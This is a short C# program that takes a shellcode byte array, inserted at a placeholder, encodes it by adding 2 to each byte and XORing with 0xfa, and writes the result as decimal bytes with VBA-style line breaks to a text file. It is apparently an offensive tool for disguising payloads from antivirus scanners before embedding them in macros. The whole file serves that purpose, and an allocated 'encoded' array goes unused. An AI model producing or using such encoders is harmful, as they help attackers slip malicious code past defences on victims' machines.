using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            !!!SHELLCODE!!!
           
            byte[] encoded1 = new byte[buf.Length]; 
            for (int i = 0; i < buf.Length; i++)
            encoded1[i] = (byte)(((uint)buf[i] + 2) & 0xFF);

            byte[] encoded = new byte[buf.Length]; 

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)encoded1[i] ^ 0xfa);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2); 
            
            foreach (byte b in buf)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if(counter % 50 == 0) { 
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            
            // Write the payload to a file named "encoded_shellcode.txt"
            File.WriteAllText("encoded_shellcode.txt", hex.ToString());

            // Read the content of the "encoded_shellcode.txt" file
            string fileContent = File.ReadAllText("encoded_shellcode.txt");

            // Print the content of the "encoded_shellcode.txt" file
            Console.WriteLine("The payload is: " + fileContent);
        }
    }
}
